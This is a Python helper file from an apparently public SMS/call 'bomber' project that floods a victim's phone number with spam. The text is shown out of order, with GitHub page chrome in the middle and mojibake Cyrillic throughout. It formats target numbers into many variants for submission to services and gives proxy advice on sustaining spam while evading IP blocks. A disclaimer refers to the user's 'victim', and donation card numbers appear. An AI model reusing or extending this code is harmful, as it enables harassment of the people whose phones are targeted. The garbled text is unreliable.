	print(colored("Ð Ð°Ð·Ñ€Ð°Ð±Ð¾Ñ‚Ñ‡Ð¸ÐºÐ¸ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñ‹ ORION Ð½Ðµ Ð½ÐµÑÑƒÑ‚ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚ÑŒ Ð·Ð° Ð´Ð¾ÑÑ‚Ð°Ð²Ð»ÐµÐ½Ð½Ñ‹Ð¹ Ð¼Ð¾Ñ€Ð°Ð»ÑŒÐ½Ñ‹Ð¹ Ð¸Ð»Ð¸ Ñ„Ð¸Ð·Ð¸Ñ‡ÐµÑÐºÐ¸Ð¹ ÑƒÑ‰ÐµÑ€Ð± Ð²Ð°ÑˆÐµÐ¹ Ð¶ÐµÑ€Ñ‚Ð²Ðµ.", "green"))
	print(colored("ÐŸÐ¾Ð»ÑŒÐ·ÑƒÑÑÑŒ Ð´Ð°Ð½Ð½Ð¾Ð¹ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð¾Ð¹ Ð²Ñ‹ Ð°Ð²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¸Ñ‡ÐµÑÐºÐ¸ ÑÐ¾Ð³Ð»Ð°ÑˆÐ°ÐµÑ‚ÐµÑÑŒ Ð½Ð° ÑÑ‚Ð¾ Ð¸ Ð±ÐµÑ€ÐµÑ‚Ðµ Ð²ÑÑŽ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚ÑŒ Ð½Ð° ÑÐµÐ±Ñ", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def donate():
	print("")
	print(colored("Ð’Ð°ÑˆÐ° Ð¿Ð¾Ð´Ð´ÐµÑ€Ð¶Ð° ÐµÑ‰Ðµ Ð±Ð¾Ð»ÑŒÑˆÐµ Ð¼Ð¾Ñ‚Ð¸Ð²Ð¸Ñ€ÑƒÐµÑ‚ Ð½Ð°Ñ Ð²Ñ‹Ð¿ÑƒÑÐºÐ°Ñ‚ÑŒ Ð¾Ð±Ð½Ð¾Ð²Ð»ÐµÐ½Ð¸Ñ!", "green"))
	print("")
	print(colored("QIWI", "yellow"))
	print("â”œ"+colored("https://qiwi.com/n/LUCKY1376", "cyan"), colored("ÐŸÐµÑ€ÐµÐ²Ð¾Ð´ Ð¿Ð¾ Ð½Ð¸ÐºÐ½ÐµÐ¹Ð¼Ñƒ", "green"))
	print("â”œ"+colored("2200 7302 4344 6206", "cyan"), colored("MIR", "green"))
	print("â””"+colored("4890 4947 5754 5546", "cyan"), colored("VISA", "blue"))
	print("")
	print(colored("Ð¡Ð±ÐµÑ€Ð±Ð°Ð½Ðº", "green"))
	print("â”œ"+colored("2202 2024 3331 7181", "cyan"), colored("MIR", "green"))
	print("â””"+colored("5469 4500 1265 2996", "cyan"), colored("MasterCard", "red"))
	print("")
	print(colored("Ð®Ð¼Ð°Ð½Ð¸", "blue"))
	print("â”œ"+colored("4100 1174 8743 5875", "cyan"), "ÐÐ¾Ð¼ÐµÑ€ ÑÑ‡ÐµÑ‚Ð°")
	print("â””"+colored("2202 1201 0852 7850", "cyan"), colored("MIR", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def faq_proxy():
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‚Ð°ÐºÐ¾Ð¹ Ð¼ÐµÐ´Ð»ÐµÐ½Ð½Ñ‹Ð¹ ÑÐ¿Ð°Ð¼ Ð¸ Ñ‚Ð°ÐºÐ°Ñ Ñ‡Ð°ÑÑ‚Ð°Ñ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ°?", "cyan"))
	print(colored("ÐÐ°Ñˆ Ð¿Ð°Ñ€ÑÐµÑ€ Ð±ÐµÑ€ÐµÑ‚ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ Ð¾Ð±Ñ‰ÐµÐ´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ñ‹Ñ… ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð², ÐºÐ¾Ð½ÐµÑ‡Ð½Ð¾ Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð¼Ñ‹ Ñ‚Ð°Ðº Ð´ÐµÐ»Ð°ÐµÐ¼ Ð¸ ÑÐ¾Ð¾Ñ‚Ð²ÐµÑÑ‚Ð²ÐµÐ½Ð½Ð¾ Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð¼Ñ‹ Ð¿Ð¾Ð»ÑŒÐ·ÑƒÐµÐ¼ÑÑ ÑÑ‚Ð¸Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸.", "green"))
	print(colored("Ð¢Ð°ÐºÐ¶Ðµ Ð½Ð° Ð´Ð°Ð½Ð½Ñ‹Ñ… ÑÐµÑ€Ð²Ð¸ÑÐ°Ñ… Ð¾Ñ‡ÐµÐ½ÑŒ Ð¼Ð°Ð»Ð¾ Ð´Ð¾Ð²Ð¾Ð»ÑŒÐ½Ð¾ Ð±Ñ‹ÑÑ‚Ñ€Ñ‹Ñ… Ð¸ Ð°Ð½Ð¾Ð½Ð¸Ð¼Ð½Ñ‹Ñ… Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‡Ñ‚Ð¾ Ð¿Ð¾Ð·Ð²Ð¾Ð»ÑÐ»Ð¾ Ð±Ñ‹ ÑƒÐ»ÑƒÑ‡ÑˆÐ¸Ñ‚ÑŒ ÑÐ¿Ð°Ð¼ Ñ Ð½Ð¸Ð¼Ð¸.", "green"))
	print(colored("Ð§Ð°ÑÑ‚Ð°Ñ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð²Ð¾Ð·Ð½Ð¸ÐºÐ°ÐµÑ‚ Ð¸Ð·-Ð·Ð° Ð½Ðµ ÑÑ‚Ð°Ð±Ð¸Ð»ÑŒÐ½Ð¾ÑÑ‚Ð¸ ÑÑ‚Ð¸Ñ… Ð¿Ñ€Ð¾ÐºÑÐ¸, Ñ‡Ð°ÑÑ‚Ð¾ Ð¾Ð½Ð¸ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð¿ÐµÑ€ÐµÑÑ‚Ð°ÑŽÑ‚ Ñ€Ð°Ð±Ð¾Ñ‚Ð°Ñ‚ÑŒ Ð¸ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð° Ð±ÐµÑ€ÐµÑ‚ ÑÐ»ÐµÐ´ÑƒÑŽÑ‰Ð¸Ð¹ Ð¸Ð· ÑÐ¿Ð¸ÑÐºÐ°.", "green"))
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ð½ÐµÐ»ÑŒÐ·Ñ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð±Ñ€Ð°Ñ‚ÑŒ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð»ÑŽÐ±Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ð° Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð½Ð¾Ð¼ÐµÑ€Ð° ÐºÐ¾Ñ‚Ð¾Ñ€Ð¾Ð³Ð¾ Ð²Ð²ÐµÐ»Ð¸?", "cyan"))
	print(colored("ÐÐµ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒÑÑ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð´Ð¾Ð¿ÑƒÑÑ‚Ð¸Ð¼ ÐºÐ°Ð½Ð°Ð´ÑÐºÐ¸Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ Ñ€Ð¾ÑÑÐ¸Ð¹ÑÐºÐ¸Ð¼Ð¸ ÑÐµÑ€Ð²Ð¸ÑÐ°Ð¼Ð¸ Ñ Ð´Ð¾Ð¼ÐµÐ½Ð¾Ð¼ .ru", "green"))
	print(colored("Ð•ÑÐ»Ð¸ Ð½Ð° ÑÐ°Ð¹Ñ‚Ðµ ÑƒÐºÐ°Ð·Ð°Ð½ Ð´Ð¾Ð¼ÐµÐ½ Ð´Ð°Ð½Ð½Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ñ‚Ð¾ Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð´Ð¾Ð»Ð¶Ð½Ñ‹ Ð±Ñ‹Ñ‚ÑŒ ÑÑ‚Ð¾Ð¹ Ð¶Ðµ ÑÑ‚Ñ€Ð°Ð½Ñ‹.", "green"))
	print(colored("Ð¡ÐµÑ€Ð²Ð¸ÑÑ‹ Ñ Ð´Ð¾Ð¼ÐµÐ½Ð¾Ð¼ ÑÐ²Ð¾ÐµÐ¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð½Ðµ Ð¿ÑƒÑÑ‚ÑÑ‚ Ð½Ð°Ñˆ Ð·Ð°Ð¿Ñ€Ð¾Ñ Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð¸Ð½Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹.", "green"))
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ð½ÐµÐ»ÑŒÐ·Ñ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð¿Ð¾Ð´ÐºÐ»ÑŽÑ‡Ð¸Ñ‚ÑŒ Ð±Ð¾Ð»ÑŒÑˆÐµ ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ð´Ð»Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸?", "cyan"))
	print(colored("90% Ð¡ÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ñ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ñ‹Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð²Ð¾Ñ€ÑƒÑŽÑ‚ Ð¸Ñ… Ð´Ñ€ÑƒÐ³ Ñƒ Ð´Ñ€ÑƒÐ³Ð° Ð¸ Ð¸Ð·-Ð·Ð° ÑÑ‚Ð¾Ð³Ð¾ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð½Ðµ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒÑÑ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ð±Ð¾Ð»ÑŒÑˆÐ¸Ð¹ ÑÐ¿Ð¸ÑÐ¾Ðº.", "green"))
	print(colored("ÐœÑ‹ ÑÑ‚Ð°Ñ€Ð°ÐµÐ¼ÑÑ Ð¸ÑÐºÐ°Ñ‚ÑŒ Ñ…Ð¾Ñ€Ð¾ÑˆÐ¸Ðµ ÑÐµÑ€Ð²Ð¸ÑÑ‹ Ñ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ñ‹Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ðµ Ð½Ðµ Ð²Ð¾Ñ€ÑƒÑŽÑ‚ Ð´Ñ€ÑƒÐ³ Ñƒ Ð´Ñ€ÑƒÐ³Ñƒ Ð¸ ÑƒÐ´Ð¾Ð±Ð½Ñ‹ Ð² Ð¿Ð°Ñ€ÑÐ¸Ð½Ð³Ðµ Ð»Ð¸Ð±Ð¾ Ð¸Ð¼ÐµÑŽÑ‚ ÑÐ²Ð¾Ð¹ API.", "green"))
	print("")
	print("")
	print(colored("Ð¡Ð¾Ð²ÐµÑ‚ÑƒÐµÐ¼ Ð²Ð°Ð¼ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð²Ð°ÑˆÐ¸ ÑÐ¾Ð±ÑÑ‚Ð²ÐµÐ½Ð½Ñ‹Ðµ Ð¿Ð¾ÐºÑƒÐ¿Ð½Ñ‹Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ ÐµÑÐ»Ð¸ Ñ…Ð¾Ñ‚Ð¸Ñ‚Ðµ ÑÐ¾ÐºÑ€Ð°Ñ‚Ð¸Ñ‚ÑŒ Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²ÐºÑƒ Ð²Ð°ÑˆÐµÐ³Ð¾ IP Ñƒ ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ð¸ Ð¸Ð¼ÐµÑ‚ÑŒ Ñ…Ð¾Ñ€Ð¾ÑˆÑƒÑŽ ÑÐºÐ¾Ñ€Ð¾ÑÑ‚ÑŒ ÑÐ¿Ð°Ð¼Ð°", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def inst_logs():
	# Checking File System Access
	try:
		if platform == "linux" or platform == "linux2":
			shutil.copyfile('tools/logs.txt', '/storage/emulated/0/Download/logs.txt')
			shutil.copyfile('tools/error_logs.txt', '/storage/emulated/0/Download/error_logs.txt')
			print(colored("Ð¤Ð°Ð¹Ð»Ñ‹", "green"), colored("logs.txt error_logs.txt", "cyan"), colored("Ð±Ñ‹Ð»Ð¸ ÑÐ¾Ñ…Ñ€Ð°Ð½ÐµÐ½Ñ‹ Ð² Ð¿Ð°Ð¿ÐºÑƒ Download Ð½Ð° Ð²Ð°ÑˆÐµÐ¼ ÑƒÑÑ‚Ñ€Ð¾Ð¹ÑÑ‚Ð²Ðµ", "green"))
			print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÑŒÑ‚Ðµ Ð¿Ð¾Ð¾Ñ‡ÐµÑ€ÐµÐ´Ð½Ð¾ ÑÑ‚Ð¸ 2 Ñ„Ð°Ð¹Ð»Ð° Ð½Ð°ÑˆÐµÐ¼Ñƒ Ð±Ð¾Ñ‚Ñƒ Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "green"), colored("https://t.me/orion_feedback_bot", "cyan"))
			print("")
			print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
			input()
		elif platform == "win32":
			print("")
			print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÑŒÑ‚Ðµ Ð½Ð°ÑˆÐµÐ¼Ñƒ Ð±Ð¾Ñ‚Ñƒ Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "green"), colored("https://t.me/orion_feedback_bot", "cyan"), colored("Ð¿Ð¾Ð¾Ñ‡ÐµÑ€ÐµÐ´Ð½Ð¾ Ñ„Ð°Ð¹Ð»Ñ‹", "green"), colored("logs.txt error_logs.txt", "cyan"), colored("Ð¸Ð· Ð¿Ð°Ð¿ÐºÐ¸", "green"), colored("tools", "cyan"))
			print("")
			print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
			input()
	except:
		print("")
		print(colored("ÐœÑ‹ Ð½Ðµ ÑÐ¼Ð¾Ð³Ð»Ð¸ Ð¿ÐµÑ€ÐµÐ¼ÐµÑÑ‚Ð¸Ñ‚ÑŒ Ñ„Ð°Ð¹Ð»Ñ‹ Ð² Ð½ÑƒÐ¶Ð½ÑƒÑŽ Ð´Ð¸Ñ€ÐµÐºÑ‚Ð¾Ñ€Ð¸ÑŽ", "yellow"))
		print(colored("Ð’Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ Ñƒ Ð²Ð°Ñ Ð´Ð»Ñ Ð¢ÐµÑ€Ð¼ÑƒÐºÑÐ° Ð² Ð½Ð°ÑÑ‚Ñ€Ð¾Ð¹ÐºÐ°Ñ… Ñ€Ð°Ð·Ñ€ÐµÑˆÐµÐ½Ð¸Ñ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸ÑŽ Ð½Ðµ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ñ‹ Ð¤Ð°Ð¹Ð»Ñ‹ Ð¸ Ð¼ÐµÐ´Ð¸Ð°ÐºÐ¾Ð½Ñ‚ÐµÐ½Ñ‚", "yellow"))
		print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ñ€Ð°Ð·Ñ€ÐµÑˆÐ¸Ñ‚Ðµ Ð¢ÐµÑ€Ð¼ÑƒÐºÑÑƒ Ð² Ð½Ð°ÑÑ‚Ñ€Ð¾Ð¹ÐºÐ°Ñ… Ð²ÑÐµ Ð½ÑƒÐ¶Ð½Ñ‹Ðµ Ñ€Ð°Ð·Ñ€ÐµÑˆÐµÐ½Ð¸Ñ Ð¸ Ð¿Ð¾Ð²Ñ‚Ð¾Ñ€Ð¸Ñ‚Ðµ Ð¿Ð¾Ð¿Ñ‹Ñ‚ÐºÑƒ"))
		print(colored("Ð—Ð° Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ð¿Ð¾ Ð´Ð°Ð½Ð½Ð¾Ð¼Ñƒ Ð²Ð¾Ð¿Ñ€Ð¾ÑÑƒ Ð¿Ð¸ÑˆÐ¸Ñ‚Ðµ Ð² Ð½Ð°ÑˆÐµÐ³Ð¾ Ð±Ð¾Ñ‚Ð° Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼"), colored("https://t.me/orion_feedback_bot", "cyan"))
		print("")
		print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
		input()

def clear_logs():
	a = open("tools/logs.txt", "w")
	a.close()
	a = open("tools/error_logs.txt", "w")
	a.close()
	print("")
	print(colored("Ð›Ð¾Ð³Ð¸ ÑƒÑÐ¿ÐµÑˆÐ½Ð¾ Ð±Ñ‹Ð»Ð¸ Ð¾Ñ‡Ð¸Ñ‰ÐµÐ½Ñ‹", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def banner_info():
	print(colored("\nÐ¢ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "cyan"))
	print("â”œ"+colored("Lucky", "green")+":", colored("https://t.me/Lucky1376", "cyan"))
	print("â”œ"+colored("LostIk", "red")+":", colored("https://t.me/LostIk31", "cyan"))
	print("â””"+colored("ÐšÐ°Ð½Ð°Ð»", "cyan")+":", colored("https://t.me/orion_bomber", "cyan"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def number_ckeck(numb):
	if len(numb) == 9 or len(numb) == 10:
		sp_numb = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
		for i in str(numb):
			try:
				int(i)
			except:
				return False
		return True
	else:
		return False

Sign up
Lucky1376
/
ORION-Bomber
Public
Code
Issues
1
Pull requests
1
Actions
Projects
Security
Insights
ORION-Bomber/tools/tools.py
@Lucky1376
Lucky1376 ðŸŽ„Happy New Year! 1.3.0
â€¦
 4 contributors
978 lines (903 sloc)  41.6 KB
# -*- coding: utf-8 -*-

# Tools for different processing

from termcolor import colored
from datetime import datetime
import requests as r, os, time, random, shutil, zipfile, webbrowser
from sys import platform
from tools import proxy
from progress.bar import ChargingBar
from tools import sender as send

def FormattingNumber(number, country):
	numb = str(number)
	if country == "ru": # For Russia
		if numb[0:1] == "+" and numb[1:2] == "7": # +71234567890
			numb_1 = numb
			numb_2 = numb[1:]
			numb_3 = "8"+numb[2:]
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
		elif numb[0:1] == "7":  # 71234567890
			numb_1 = "+"+numb
			numb_2 = numb
			numb_3 = "8"+numb[1:]
			numb = "+"+numb
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
		elif numb[0:1] == "8":  # 81234567890
			numb_1 = "+7"+numb[1:]
			numb_2 = "7"+numb[1:]
			numb_3 = numb
			numb = "+7"+numb[1:]
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
	elif country == "by": # For Belarus
		if numb[0:1] == "+": # +123456789012
			numb_1 = numb
			numb_2 = numb[1:]
			numb_3 = numb[4:]
			numb_4 = numb[:4] + ' (' + numb[4:6] + ") " + numb[6:9] + '-' + numb[9:11] + '-' + numb[11:13]
			numb_5 = numb[:4] + ' (' + numb[4:6] + ") " + numb[6:9] +numb[9:11] +numb[11:13]
		elif numb[0:1] == "3" or numb[0:3] == "375": # 123456789012
			numb_1 = "+"+numb
			numb_2 = numb
			numb_3 = numb[3:]
			numb_4 = '+' + numb[:3] + ' (' + numb[3:5] + ") " + numb[5:8] + '-' + numb[8:10] + '-' + numb[10:12]
			numb_5 = numb_1[:4] + ' (' + numb_1[4:6] + ") " + numb_1[6:9] +numb_1[9:11] +numb_1[11:13]
	if country == "by":
		return numb_1, numb_2, numb_3, numb_4, numb_5
	elif country == "ru":
		return numb_1, numb_2, numb_3, numb_4, numb_5, numb_6, numb_7, numb_8, numb_9, numb_10

def clear():
	if platform == "linux" or platform == "linux2" or platform == "darwin":
		os.system("clear")
	elif platform == "win32":
		os.system("cls")
	else:
		print(colored("\nÐ˜Ð·Ð²Ð¸Ð½Ð¸Ñ‚Ðµ Ð½Ð°ÑˆÐ° Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð° Ð½Ðµ Ð¿Ð¾Ð´Ð´ÐµÑ€Ð¶Ð¸Ð²Ð°ÐµÑ‚ Ð²Ð°ÑˆÑƒ Ð¾Ð¿ÐµÑ€Ð°Ñ†Ð¸Ð¾Ð½Ð½ÑƒÑŽ ÑÐ¸ÑÑ‚ÐµÐ¼Ñƒ ;(\n", "red"))
		exit()

def anim_text(text, speed, color="green"):
	for i in text:
		print(colored(i, color), end="", flush=True)
		time.sleep(speed)

def RCT(text):
	colors = ["green", "yellow", "red", "magenta", "blue"]
	new_text = ""
	for i in str(text):
		new_text += colored(i, random.choice(colors))
	return new_text

def banner():
	a = open("tools/version.txt", "r")
	ver = a.read().split("\n")[0]
	a.close()

	ru_s = str(len(send.services_list))
	by_s = str(len(send.services_list_by))

	banner = colored("""
	   â†   â†       â†        â†     â†   â†   â†
	â†		    â†        â†       â†     â†
	 â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–„  â† â–ˆ 
	â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’â–“â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’ â–ˆâ–ˆ â–€â–ˆ   â–ˆ 
	â–’â–ˆâ–ˆâ–‘â† â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’â–’â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–‘â† â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ  â–€â–ˆ â–ˆâ–ˆâ–’
	â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆâ–€â–€â–ˆâ–„  â–‘â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–“â–ˆâ–ˆâ–’  â–â–Œâ–ˆâ–ˆâ–’
	â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’â–‘â–ˆâ–ˆâ–‘â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–’â–ˆâ–ˆâ–‘   â–“â–ˆâ–ˆâ–‘
	â–‘ â–’â–‘â–’â–‘â–’â–‘ â–‘ â–’â–“ â–‘â–’â–“â–‘â–‘â–“  â–‘ â–’â–‘â–’â–‘â–’â–‘ â–‘ â–’â–‘ â† â–’ â–’ 
	  â–‘ â–’ â–’â–‘   â–‘â–’ â–‘ â–’â–‘ â–’ â–‘  â–‘ â–’ â–’â–‘ â–‘ â–‘â–‘   â–‘ â–’â–‘
	â–‘ â–‘ â–‘ â–’ â†  â–‘â–‘   â–‘  â–’ â–‘â–‘ â–‘ â–‘ â–’     â–‘   â–‘ â–‘ 
	    â–‘ â–‘     â–‘  â†   â–‘     â†â–‘ â–‘  â†    â†   â–‘ 
	 â†  	â†          â†        â†""", "blue")

	new_year = " "*21+RCT("Happy New Year!")
	pred_info = "\n"+" "*24+colored("Ð¡ÐµÑ€Ð²Ð¸ÑÑ‹", "green")+"\n"
	pred_info_ru = " "*17+colored("Ð Ð¾ÑÑÐ¸Ñ ", "blue")+colored(ru_s, "green")+"   "
	pred_info_by = colored("Ð‘ÐµÐ»Ð°Ñ€ÑƒÑÑŒ ", "cyan")+colored(by_s, "green")+"\n"
	pred_info = pred_info+pred_info_ru+pred_info_by

	info = " "*13+colored("[", "blue")+"Developers :"+colored("Lucky", "green")+" and "+colored("LostIk", "red")
	info_2 = " "*13+colored("[", "blue")+"Version    :"+colored(ver, "red")+"ðŸŽ„"
	info_3 = " "*13+colored("[", "blue")+"Telegram   :"+colored("@orion_bomber", "cyan")+colored("   <--", "green")+"\n"

	print(banner)
	print(new_year)
	print(pred_info)
	print(info)
	print(info_2)
	print(info_3)

def banner_tools():
	print(colored("[1]", "red"), colored("ÐÐ°Ñ‡Ð°Ñ‚ÑŒ ÑÐ¿Ð°Ð¼", "green"))
	#print(colored("[2]", "red"), colored("FAQ ÐŸÑ€Ð¾ Ð¿Ñ€Ð¾ÐºÑÐ¸", "blue"))
	#print(colored("[3]", "red"), colored("ÐšÑ€Ð°Ñ‚ÐºÐ¾Ðµ Ñ€ÑƒÐºÐ¾Ð²Ð¾Ð´ÑÑ‚Ð²Ð¾ Ð¿Ñ€Ð¾Ð±Ð»ÐµÐ¼", "cyan"))
	#print(colored("[4]", "red"), colored("ÐžÑ‚ÐºÐ°Ð· Ð¾Ñ‚ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚Ð¸", "red"))
